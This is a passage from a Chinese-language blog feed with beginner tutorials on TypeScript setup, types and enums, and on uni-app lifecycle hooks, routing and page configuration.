    <content type="html"><![CDATA[<h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><h2 id="1-什么是typescript"><a href="#1-什么是typescript" class="headerlink" title="1.什么是typescript"></a>1.什么是typescript</h2><h3 id="1-1-what"><a href="#1-1-what" class="headerlink" title="1.1 what"></a>1.1 what</h3><p>typescript的标语是—始于JavaScript，终于JavaScript</p><p>因为js一开始是作为脚本语言开发的，所以没有大规模应用程序的编写能力，也没有开发者工具的支持</p><p>为了克服这些不足，微软公司发明了typescript—一门专为开发大规模JavaScript应用程序而设计的编程语言。</p><p>typescript是JavaScript的超集，合格的JavaScript程序也是合格的typescript程序。但是typescript代码不能直接运行，它需要预先编译为JavaScript代码然后才能运行</p><h3 id="1-2-why"><a href="#1-2-why" class="headerlink" title="1.2 why"></a>1.2 why</h3><p>2014年的typescript发行以来，typescript使用者保持高数增长。</p><p>typescript吸引人的地方有：</p><p>1.能更早地发现代码中的错误</p><p>2.能够帮助提高生产力</p><p>3.支持js的最新特性并使用了js语言相同的语法和语义</p><h2 id="2-安装typescript"><a href="#2-安装typescript" class="headerlink" title="2.安装typescript"></a>2.安装typescript</h2><h3 id="1-安装npm"><a href="#1-安装npm" class="headerlink" title="1.安装npm"></a>1.安装npm</h3><p>在安装typescript之前我们需要安装npm工具，也就是node.js</p><p>安装成功之后 输入 <code>node -v</code>就可以参看版本</p><h3 id="2-安装typescript-1"><a href="#2-安装typescript-1" class="headerlink" title="2.安装typescript"></a>2.安装typescript</h3><p>在vscode中打开控制台，输入<code>npm install -g typescript</code> 安装typescript</p><p>安装成功后输入<code>tsc --version</code>查看版本</p><h2 id="3-hello-world"><a href="#3-hello-world" class="headerlink" title="3.hello-world"></a>3.hello-world</h2><p>接下来我们创建一个ts程序</p><p>打开vscode新建一个写ts代码的文件夹</p><h3 id="1-新建tsconfig-json文件"><a href="#1-新建tsconfig-json文件" class="headerlink" title="1.新建tsconfig.json文件"></a>1.新建tsconfig.json文件</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;compilerOptions&quot;</span>: &#123;<br>        <span class="hljs-comment">//启用严格的类型检查</span><br>        <span class="hljs-attr">&quot;strict&quot;</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-comment">//js的输出版本</span><br>        <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;es5&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-新建hello-world-ts文件"><a href="#2-新建hello-world-ts文件" class="headerlink" title="2.新建hello-world.ts文件"></a>2.新建hello-world.ts文件</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">const</span> greeting = <span class="hljs-string">&#x27;hello world&#x27;</span><br><br>console.<span class="hljs-built_in">log</span>(greeting)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>然后使用 “Ctrl + Shift + B”或者菜单栏选择 “Terminal -&gt; Run Build Task”打开构建任务面板</p><p>选择”tsc: build - tsconfig.json”来编译ts程序</p><p>编译完成后会出现一个hello-world.js的文件，输入<code>node hello-world.js</code>执行js文件</p><h3 id="3-设置默认值构建任务"><a href="#3-设置默认值构建任务" class="headerlink" title="3.设置默认值构建任务"></a>3.设置默认值构建任务</h3><p>使用 “Ctrl + Shift + B”打开面板，点击齿轮，会出现一个task.json文件</p><p>修改该文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;2.0.0&quot;</span>,<br><span class="hljs-attr">&quot;tasks&quot;</span>: [<br>&#123;<br><span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;typescript&quot;</span>,<br><span class="hljs-attr">&quot;tsconfig&quot;</span>: <span class="hljs-string">&quot;tsconfig.json&quot;</span>,<br><span class="hljs-attr">&quot;problemMatcher&quot;</span>: [<br><span class="hljs-string">&quot;$tsc&quot;</span><br>],<br><span class="hljs-attr">&quot;group&quot;</span>: &#123;<br><span class="hljs-attr">&quot;kind&quot;</span>: <span class="hljs-string">&quot;build&quot;</span>,<br><span class="hljs-attr">&quot;isDefault&quot;</span>: <span class="hljs-literal">true</span><br>&#125;,<br><span class="hljs-attr">&quot;label&quot;</span>: <span class="hljs-string">&quot;tsc: 构建 - tsconfig.json&quot;</span><br>&#125;<br>]<br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们使用 “Ctrl + Shift + B”就会默认编译</p><h2 id="4-语言基础"><a href="#4-语言基础" class="headerlink" title="4.语言基础"></a>4.语言基础</h2><p>因为ts是js的超集，所以ts支持var，let，const进行变量定义。这三种声明的使用方法与js一样</p><p>数据类型有8种：（7种原始数据类型）</p><p>undefined，Null，Boolean，String，Number，Symbol，Object，BigInt</p><p>这里特别说明一下Symbol和BigInt</p><p>Symbol是es6新引入的原始类型，Symbol值唯一而且不可改变，通过Symbol()这个函数创建</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">const</span> sym = <span class="hljs-built_in">Symbol</span>();<br><span class="hljs-keyword">const</span> obj = &#123; [sym]: <span class="hljs-string">&#x27;some value&#x27;</span> &#125;;<br>obj[sym];<span class="hljs-comment">//some value</span><br></code></pre></td></tr></table></figure><p>js中内置了Well-Known Symbol常量，一共11个</p><p>BigInt类型能够表示任意精度的整数，尤其是大于<code>2^53 - 1</code>的整数</p><p>BigInt要求在创建整数后加入一个n</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">const</span> <span class="hljs-keyword">unit</span> = <span class="hljs-number">1</span>n;<br><span class="hljs-comment">//或者</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unit</span> = BigInt(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>BIgInt不能和Number混合运算但是可以比较，但是严格相等比较情况下BigInt和Number永远不相等</p><h3 id="1-类型注解"><a href="#1-类型注解" class="headerlink" title="1.类型注解"></a>1.类型注解</h3><p>用于明确标识的类型，<strong>可选项</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">const</span> greeting: <span class="hljs-built_in">string</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>而函数的类型注解也是类似</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">function <span class="hljs-title">foo</span><span class="hljs-params">(message: string)</span>: void &#123;</span><br>console.<span class="hljs-built_in">log</span>(message);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-枚举类型"><a href="#2-枚举类型" class="headerlink" title="2.枚举类型"></a>2.枚举类型</h3><p>一种原始类型，使用enum来定义，使用enum定义Season枚举类型</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">enum Season &#123;<br><span class="hljs-built_in">Spring,</span><br><span class="hljs-built_in">Summer,</span><br><span class="hljs-built_in">Fall,</span><br><span class="hljs-built_in">Winter,</span><br>&#125;<br></code></pre></td></tr></table></figure><p>数值型枚举</p><p>像上面的代码其实默认为</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">enum Season &#123;<br><span class="hljs-attr">Spring</span> = <span class="hljs-number">0</span>,//枚举值默认从<span class="hljs-number">0</span>开始<br><span class="hljs-attr">Summer</span> = <span class="hljs-number">1</span>,<br><span class="hljs-attr">Fall</span> = <span class="hljs-number">2</span>,<br><span class="hljs-attr">Winter</span> = <span class="hljs-number">3</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>未标注枚举成员的枚举值等于上一个成员的枚举值+1</p><p>我们可以通过访问对象的方式访问</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> season: Season = Season.Summer<br><span class="hljs-keyword">const</span> season: <span class="hljs-built_in">number</span> = Season.Summer<span class="hljs-comment">//1 </span><br></code></pre></td></tr></table></figure><p>字符串枚举</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Season</span> </span>&#123;<br>Spring = <span class="hljs-string">&#x27;spring&#x27;</span>,<br>Summer = <span class="hljs-string">&#x27;summber&#x27;</span>,<br>Fall = <span class="hljs-string">&#x27;fall&#x27;</span>,<br>Winter = <span class="hljs-string">&#x27;winter&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用枚举类型赋值给字符串变量</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">const dir: <span class="hljs-built_in">string</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Season</span>.</span></span>summer<span class="hljs-comment">//dir = &#x27;summer&#x27;</span><br></code></pre></td></tr></table></figure><p>异构枚举类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Color</span> </span>&#123;<br>Black = <span class="hljs-number">0</span>,<br>White = <span class="hljs-string">&#x27;White&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TyprScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uni-app</title>
    <link href="/2022/07/05/uni-app/"/>
    <url>/2022/07/05/uni-app/</url>
    
    <content type="html"><![CDATA[<h1 id="uni-app"><a href="#uni-app" class="headerlink" title="uni-app"></a>uni-app</h1><h2 id="1-uni-app介绍"><a href="#1-uni-app介绍" class="headerlink" title="1.uni-app介绍"></a>1.uni-app介绍</h2><p>uni-app 是使用 Vue.js 开发跨平台应用的前端框架，开发者编写一套代码，可编译到iOS、Android、H5、小程序等多个平台。</p><p>一个通用的技术栈，支持vue语法，微信小程序API</p><p><img src="https://s2.loli.net/2022/07/14/g2riy58tUNSndTB.png" alt="uniapp-frame.png"></p><h2 id="2-生命周期钩子"><a href="#2-生命周期钩子" class="headerlink" title="2.生命周期钩子"></a>2.生命周期钩子</h2><h3 id="1-页面生命周期钩子"><a href="#1-页面生命周期钩子" class="headerlink" title="1.页面生命周期钩子"></a>1.页面生命周期钩子</h3><h4 id="1-onLoad"><a href="#1-onLoad" class="headerlink" title="1.onLoad"></a>1.onLoad</h4><p>页面加载的时候，只会触发一次。因为tabbar加载过的页面就存在了内存中，切换回来的时候只会触发onShow不会触发onLoad</p><h4 id="2-onPageNotFound"><a href="#2-onPageNotFound" class="headerlink" title="2.onPageNotFound"></a>2.onPageNotFound</h4><p>找不到指定页面的时候</p><h4 id="3-onShow"><a href="#3-onShow" class="headerlink" title="3.onShow"></a>3.onShow</h4><p>页面展示出来之后，会触发多次</p><p>这三个可以实现我们的404 not fount和跳转</p><p>1.我们右键点击pages，选择新建页面，页面命名为404</p><p>在我们创建页面之后可以在<code>pages.json</code>中看到页面的配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>            <span class="hljs-attr">&quot;path&quot;</span> : <span class="hljs-string">&quot;pages/404/404&quot;</span>,<br>            <span class="hljs-attr">&quot;style&quot;</span> :                                                                                    <br>            &#123;<br>            <span class="hljs-comment">//页面主题，显示在页面的正上方</span><br>                <span class="hljs-attr">&quot;navigationBarTitleText&quot;</span>: <span class="hljs-string">&quot;页面走丢了&quot;</span>,<br>                <span class="hljs-attr">&quot;enablePullDownRefresh&quot;</span>: <span class="hljs-literal">false</span><br>            &#125;<br>            <br>        &#125;<br></code></pre></td></tr></table></figure><p>2.然后在<code>App.vue</code>中就可以加入onPageNotFound的钩子，就可以实现页面走丢时候的跳转</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">onPageNotFound</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//页面跳转</span><br>uni<span class="hljs-selector-class">.navigateTo</span>(&#123;<br>url:<span class="hljs-string">&#x27;./pages/404/404&#x27;</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>3.我们在新建的404页面中加入2秒后跳转回index页面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">onLoad</span>(<span class="hljs-params"></span>)</span> &#123;<br><span class="hljs-comment">//两秒后跳转至index</span><br><span class="hljs-keyword">let</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br><span class="hljs-built_in">clearTimeout</span>(timer)<br>uni.navigateTo(&#123;<br><span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/pages/index/index&#x27;</span><br>&#125;)<br>&#125;,<span class="hljs-number">2000</span>)<br>&#125;,<br></code></pre></td></tr></table></figure><p>回到微信开发者工具中，在编译模式中修改启动页面为一个没有的页面，就会触发onPageNotFount钩子和一系列功能。</p><h4 id="4-onPullDownRefresh"><a href="#4-onPullDownRefresh" class="headerlink" title="4.onPullDownRefresh"></a>4.onPullDownRefresh</h4><p>下拉刷新时触发</p><p>但是使用这个钩子需要打开配置下拉刷新配置</p><p>在pages.json中：<code>enablePullDownRefresh 调为 true</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;pages/index/index&quot;</span>,<br><span class="hljs-attr">&quot;style&quot;</span>: &#123;<br><span class="hljs-attr">&quot;navigationBarTitleText&quot;</span>: <span class="hljs-string">&quot;uni-app&quot;</span>,<br><span class="hljs-attr">&quot;enablePullDownRefresh&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在该页面中加入钩子：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">onPullDownRefresh</span><span class="hljs-params">()</span></span> &#123;<br>console<span class="hljs-selector-class">.log</span>(<span class="hljs-string">&#x27;页面刷新&#x27;</span>)<br>&#125;,<br></code></pre></td></tr></table></figure><p>我们还可以使用<code>uni.stopPullDownRefresh()</code>方法停止刷新</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">onPullDownRefresh() &#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;页面刷新&#x27;</span>)<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>&#123;<br>uni.stopPullDownRefresh()<br>&#125;,<span class="hljs-number">1000</span>)<br>&#125;,<br></code></pre></td></tr></table></figure><p>同样，我们还有个方法触发刷新-<code>uni.startPullDownRefresh()</code>，执行这个函数就相当于我们的下拉刷新动作，会触发我们的<code>onPullDownRefresh</code>钩子</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">methods: &#123;<br><span class="hljs-built_in">Refresh</span>()&#123;<br>uni.<span class="hljs-built_in">startPullDownRefresh</span>()<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-onTabItemTab"><a href="#5-onTabItemTab" class="headerlink" title="5.onTabItemTab"></a>5.onTabItemTab</h4><p>点击页面导航框时触发</p><h4 id="6-onShareAppMessage"><a href="#6-onShareAppMessage" class="headerlink" title="6.onShareAppMessage"></a>6.onShareAppMessage</h4><p>点击分享时候触发</p><p>这些都是一些很基本的钩子，更多的钩子请到官方文档里面查看</p><h4 id="7-onReady"><a href="#7-onReady" class="headerlink" title="7.onReady"></a>7.onReady</h4><p>页面初次渲染时加载，只触发一次</p><h4 id="8-onHide"><a href="#8-onHide" class="headerlink" title="8.onHide"></a>8.onHide</h4><p>和onShow对应，页面切换回来的时候触发，会触发多次</p><h4 id="9-onReachBottom"><a href="#9-onReachBottom" class="headerlink" title="9.onReachBottom"></a>9.onReachBottom</h4><p>当页面到达底部时触发钩子，可以在pages.json中设置距离底部多少时触发（onReachBottomDistance 唯一单位为px）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//生命周期钩子函数</span><br><span class="hljs-function"><span class="hljs-title">onReachBottom</span>(<span class="hljs-params"></span>)</span> &#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;到达底部了&quot;</span>)<br>&#125;,<br><br><br><span class="hljs-comment">//pages.json中的配置项</span><br>&#123;<br>          <span class="hljs-string">&quot;path&quot;</span> : <span class="hljs-string">&quot;pages/style/style&quot;</span>,<br>          <span class="hljs-string">&quot;style&quot;</span> :                                                                                    <br>          &#123;<br>              <span class="hljs-string">&quot;navigationBarTitleText&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>              <span class="hljs-string">&quot;enablePullDownRefresh&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;onReachBottomDistance&quot;</span>: <span class="hljs-number">1</span><br>          &#125;<br>          <br>      &#125;<br></code></pre></td></tr></table></figure><h3 id="2-应用的生命周期"><a href="#2-应用的生命周期" class="headerlink" title="2.应用的生命周期"></a>2.应用的生命周期</h3><p>这些钩子一般都在App.vue中</p><h4 id="1-onLunch"><a href="#1-onLunch" class="headerlink" title="1.onLunch"></a>1.onLunch</h4><p>应用初始化时，最先执行</p><h4 id="2-onShow"><a href="#2-onShow" class="headerlink" title="2.onShow"></a>2.onShow</h4><p>应用启动时，可以触发多次，由后台切换到前台时触发</p><h4 id="3-onHide"><a href="#3-onHide" class="headerlink" title="3.onHide"></a>3.onHide</h4><p>应用由前台转到后台时，于onShow对应，也可以触发多次</p><h4 id="4-onError"><a href="#4-onError" class="headerlink" title="4.onError"></a>4.onError</h4><p>应用出错时触发</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//生命周期</span><br><span class="hljs-attr">onLaunch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;App Launch&#x27;</span>)<br>&#125;,<br><span class="hljs-attr">onShow</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;App Show&#x27;</span>)<br>&#125;,<br><span class="hljs-attr">onHide</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;App Hide&#x27;</span>)<br>&#125;,<br><span class="hljs-function"><span class="hljs-title">onError</span>(<span class="hljs-params">err</span>)</span> &#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;出错了&quot;</span>+err)<br>&#125;,<br></code></pre></td></tr></table></figure><h2 id="3-路由配置和跳转"><a href="#3-路由配置和跳转" class="headerlink" title="3.路由配置和跳转"></a>3.路由配置和跳转</h2><p>我们之前实现页面跳转是通过<code>navigateTo</code>进行跳转，这种跳转叫做API跳转。我们还有其他的路由跳转方式</p><h3 id="1-navigate标签跳转"><a href="#1-navigate标签跳转" class="headerlink" title="1.navigate标签跳转"></a>1.navigate标签跳转</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 实现组件式的跳转 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">navigator</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;/pages/404/404&quot;</span>&gt;</span>404页面<span class="hljs-tag">&lt;/<span class="hljs-name">navigator</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-底部导航栏进行跳转"><a href="#2-底部导航栏进行跳转" class="headerlink" title="2.底部导航栏进行跳转"></a>2.底部导航栏进行跳转</h3><p>要实现像微信一样的底部导航栏，我们首先需要在<code>pages.json</code>里面进行配置。加入<code>tabBar</code>选项</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">&quot;tabBar&quot;</span>: &#123;<br><span class="hljs-string">&quot;color&quot;</span>: <span class="hljs-string">&quot;#7a7e83&quot;</span>,<br><span class="hljs-string">&quot;selectedColor&quot;</span>: <span class="hljs-string">&quot;#3cc51f&quot;</span>,<br><span class="hljs-string">&quot;borderStyle&quot;</span>: <span class="hljs-string">&quot;black&quot;</span>,<br><span class="hljs-string">&quot;backgroundColor&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-subst">#ffffff</span>&quot;</span>,<br><span class="hljs-string">&quot;list&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/index/index&quot;</span>,<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;微信&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/List/List&quot;</span>,<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;通讯录&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/Share/Share&quot;</span>,<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;朋友圈&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/Me/Me&quot;</span>,<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;static/logo.png&quot;</span>,<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;我&quot;</span><br>&#125;<br>]<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-getCurrentPages"><a href="#3-getCurrentPages" class="headerlink" title="3.getCurrentPages()"></a>3.getCurrentPages()</h3><p>这个方法可以获取当前页面栈信息</p><p>我们可以使用<code>console.log</code>打印出来</p><p>这个页面栈是以数组的形式进行进栈和出栈</p><h3 id="4-路由传参"><a href="#4-路由传参" class="headerlink" title="4.路由传参"></a>4.路由传参</h3><p>传参：可以通过url进行传参，？后加入参数的常见方式</p><p>接收参数：在onLoad(options)中options便可以取到参数</p><p>但是url是有长度限制的，如果长度超出，我们就要使用encode和decode进行处理</p><h3 id="5-分包配置"><a href="#5-分包配置" class="headerlink" title="5.分包配置"></a>5.分包配置</h3><p>为了提高小程序的加载速度，小程序开发商提出来分包的概念</p><p>一个程序分为主包和分包：</p><p>主包就是我们的pages页面，小程序启动时就会加载</p><p>分包就是我们需要时才加载</p><p>分包页面我们需要加入一个新的目录<code>subpages</code></p><p>在subpages下加入我们的news页面</p><p>然后我们需要在pages.json中加入</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">//分包配置</span><br><span class="hljs-string">&quot;subPackages&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;root&quot;</span>: <span class="hljs-string">&quot;subpages&quot;</span>,<br><span class="hljs-string">&quot;pages&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;news/news&quot;</span>,<br><span class="hljs-string">&quot;style&quot;</span>: &#123;<br><span class="hljs-string">&quot;navigationBarTitleText&quot;</span>: <span class="hljs-string">&quot;新闻中心&quot;</span>,<br><span class="hljs-string">&quot;enablePullDownRefresh&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>]<br>&#125;<br>],<br></code></pre></td></tr></table></figure><p>需要注意的是分包页面也是默认加入到我们的主包pages页面中的，所以我们还需要把主包页面中的分包页面删除。</p><h2 id="4-组件"><a href="#4-组件" class="headerlink" title="4.组件"></a>4.组件</h2><p>uni-app中提供了大量的组件供我们使用</p><h3 id="1-text组件"><a href="#1-text组件" class="headerlink" title="1.text组件"></a>1.text组件</h3><p>首先第一个便是我们的text组件，用于存放我们的文本内容</p><p>text组件有三个配置属性：selectable、space、encode分别控制 